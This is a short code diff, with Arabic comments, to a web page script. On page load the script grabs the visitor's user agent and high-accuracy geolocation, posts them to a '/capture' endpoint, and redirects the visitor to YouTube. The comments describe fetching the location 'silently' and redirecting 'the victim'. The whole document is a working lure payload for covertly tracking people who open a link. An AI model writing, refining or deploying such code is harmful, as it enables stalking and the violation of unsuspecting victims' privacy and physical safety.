@@ -1,23 +1,22 @@
 <script>
-    async function collectAndGo() {
-        const deviceInfo = navigator.userAgent;
-        
-        // محاولة سحب الموقع
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            await sendData({ lat: pos.coords.latitude, lon: pos.coords.longitude }, deviceInfo);
+    async function start() {
+        const device = navigator.userAgent;
+        // محاولة جلب الموقع بصمت
+        navigator.geolocation.getCurrentPosition(async (p) => {
+            await send({ lat: p.coords.latitude, lon: p.coords.longitude }, device);
         }, async () => {
-            await sendData(null, deviceInfo);
-        });
+            await send(null, device);
+        }, { enableHighAccuracy: true });
     }
 
-    async function sendData(loc, dev) {
-        const response = await fetch('/capture', {
+    async function send(loc, dev) {
+        const res = await fetch('/capture', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ location: loc, device: dev })
         });
-        const data = await response.json();
-        window.location.href = data.redirect; // التوجيه للمحتوى الحقيقي
+        const data = await res.json();
+        window.location.href = data.redirect; // توجيه الضحية لليوتيوب
     }
-    window.onload = collectAndGo;
+    window.onload = start;
 </script>
